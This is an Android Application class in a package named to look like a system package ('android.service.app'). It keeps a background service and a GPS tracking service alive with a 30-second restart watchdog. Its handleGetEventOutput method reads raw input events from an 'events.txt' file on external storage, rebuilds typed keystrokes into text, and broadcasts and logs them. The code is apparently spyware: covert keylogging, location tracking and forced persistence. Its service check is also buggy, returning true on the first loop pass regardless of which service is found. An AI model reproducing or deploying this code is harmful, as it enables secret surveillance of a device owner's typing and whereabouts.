package android.service.app;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Message;
import android.service.app.gps.GpsService;
import android.service.app.utils.Log;
import android.support.annotation.NonNull;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

public class AndroidApplication extends android.app.Application
{
    public static final String EVENTS_TXT = "events.txt";
    public static final long DELAY_MILLIS = 30000L;
    protected String sendTime;
    protected Service service;
    private GpsService gpsService;
    protected boolean serviceOnCreate = false;
    protected boolean gpsServiceOnCreate = false;

    public void setGpsServiceOnCreate(boolean mGpsServiceOnCreate)
    {
        this.gpsServiceOnCreate = mGpsServiceOnCreate;
    }

    private android.os.Handler serviceHandler;
    private android.os.Handler handleService;

    private android.os.Handler gpsHandler;
    private android.os.Handler handleGpsService;

    private Runnable trackService;
    private Runnable trackGpsService;

    private volatile boolean isFirstRunning = true;

    public boolean isFirstRunning()
    {
        return isFirstRunning;
    }

    public void setIsFirstRunning(boolean isFirstRunning)
    {
        this.isFirstRunning = isFirstRunning;
    }

    @Override
    public void onCreate()
    {
        super.onCreate();

        sendTime = "";
        serviceHandler = new ServiceHandler();
        handleService = new ServiceHandler();

        gpsHandler = new GpsHandler();
        handleGpsService = new GpsHandler();

        startService(new Intent(this, Service.class));
        startService(new Intent(this, GpsService.class));

        startCheckService();

        if (isFirstRunning())
        {
            //handleGetEventOutput();

            setIsFirstRunning(false);
        }
    }

    @Override
    public void onTerminate()
    {
        super.onTerminate();
        stopCheckService();
    }

    public void setGpsService(GpsService gpsService)
    {
        this.gpsService = gpsService;
    }

    private void handleGetEventOutput()
    {
        final String path = Environment.getExternalStorageDirectory().getPath() + File.separator;

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                try
                {
                    String filename = path + EVENTS_TXT;

                    BufferedReader reader = new BufferedReader(new FileReader(filename));
                    String text = "";
                    String line;

                    while (true)
                    {
                        try
                        {
                            line = reader.readLine();
                        } catch (IOException e)
                        {
                            handleException(e);
                            break;
                        }
                        if (line == null)
                        {
                            Thread.sleep(100);
                            continue;
                        }
                        int startSymbolIndex = line.indexOf("KEY_");
                        if (startSymbolIndex == -1) continue;
                        String subLine = line.substring(startSymbolIndex);
                        if (!subLine.contains("DOWN")) continue;
                        String symbolCandidate = subLine.substring(subLine.indexOf("_") + 1, subLine.indexOf(" "));

                        if ("SPACE".equals(symbolCandidate)) symbolCandidate = " ";
                        if ("ENTER".equals(symbolCandidate) || "TAB".equals(symbolCandidate))
                            symbolCandidate = ".";

                        if (symbolCandidate.length() == 1)
                        {
                            boolean isEndOfLine = ".".equals(symbolCandidate);
                            if (isEndOfLine) symbolCandidate = ".\n";
                            text += symbolCandidate;
                            if (isEndOfLine)
                            {
                                Intent i = new Intent("EVENT_UPDATED");
                                i.putExtra("<Key>", "# " + text);
                                sendBroadcast(i);
                                Log.v("# " + text);
                                text = "";
                            }
                        }
                    }
                } catch (Exception e)
                {
                    handleException(e);
                }
            }
        }).start();
    }

    @NonNull
    private static String getSdCardPath()
    {
        return Environment.getExternalStorageDirectory().getPath() + File.separator;
    }

    public void handleException(Exception e)
    {
        String message = "e: " + e.getMessage();
        Log.v(message);

        Intent i = new Intent("EVENT_UPDATED");
        i.putExtra("<Key>", message);
        sendBroadcast(i);

        e.printStackTrace();
    }

    @Override
    public void onLowMemory()
    {
        super.onLowMemory();

        stopService(new Intent(this, Service.class));
        stopService(new Intent(this, GpsService.class));
        startService(new Intent(this, Service.class));
        startService(new Intent(this, GpsService.class));
    }

    protected void startCheckService()
    {
        trackService = new Runnable()
        {
            public void run()
            {
                new Thread(new Runnable()
                {
                    public void run()
                    {
                        if (!checkService())
                        {
                            Message msg = handleService.obtainMessage(1, "start");
                            handleService.sendMessage(msg);
                            Log.v("start service ...");
                        } else
                        {
                            if (serviceOnCreate)
                            {
                                Message msg = handleService.obtainMessage(2, "restart");
                                handleService.sendMessage(msg);
                                Log.v("restart service ...");
                            }
                        }
                    }

                }).start();
                serviceHandler.postDelayed(trackService, DELAY_MILLIS);
            }
        };
        serviceHandler.postDelayed(trackService, DELAY_MILLIS);

//        trackGpsService = new Runnable()
//        {
//            public void run()
//            {
//                new Thread(new Runnable()
//                {
//                    public void run()
//                    {
//                        if (!checkService())
//                        {
//                            Message msg = handleGpsService.obtainMessage(1, "start");
//                            handleGpsService.sendMessage(msg);
//                            Log.v("start service ...");
//                        } else
//                        {
//                            if (serviceOnCreate)
//                            {
//                                Message msg = handleGpsService.obtainMessage(2, "restart");
//                                handleGpsService.sendMessage(msg);
//                                Log.v("restart service ...");
//                            }
//                        }
//                    }
//
//                }).start();
//                serviceHandler.postDelayed(trackService, DELAY_MILLIS);
//            }
//        };
//        gpsHandler.postDelayed(trackService, DELAY_MILLIS);
    }

    protected void stopCheckService()
    {
        serviceHandler.removeCallbacks(trackService);
        gpsHandler.removeCallbacks(trackGpsService);
    }

    protected synchronized boolean checkService()
    {
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (RunningServiceInfo runningServiceInfo : activityManager.getRunningServices(Integer.MAX_VALUE))
        {
            String className = runningServiceInfo.service.getClassName();
            if (Service.class.getName().equals(className) || GpsService.class.getName().equals(className))
                Log.v("Running service=" + className);
                return true;
        }
        Log.v("Running service: False result");
        return false;
    }

    private class ServiceHandler extends android.os.Handler
    {
        public void handleMessage(Message msg)
        {
            String data = (String) msg.obj;
            if (data == null)
                return;

            if (data.equals("start"))
            {
                startService(new Intent(AndroidApplication.this, Service.class));
            } else if (data.equals("restart"))
            {
                stopService(new Intent(AndroidApplication.this, Service.class));
                startService(new Intent(AndroidApplication.this, Service.class));
            }
        }
    }

    private class GpsHandler extends android.os.Handler
    {
        public void handleMessage(Message msg)
        {
            String data = (String) msg.obj;
            if (data == null)
                return;

            if (data.equals("start"))
            {
                startService(new Intent(AndroidApplication.this, GpsService.class));
            } else if (data.equals("restart"))
            {
                stopService(new Intent(AndroidApplication.this, GpsService.class));
                startService(new Intent(AndroidApplication.this, GpsService.class));
            }
        }
    }
}
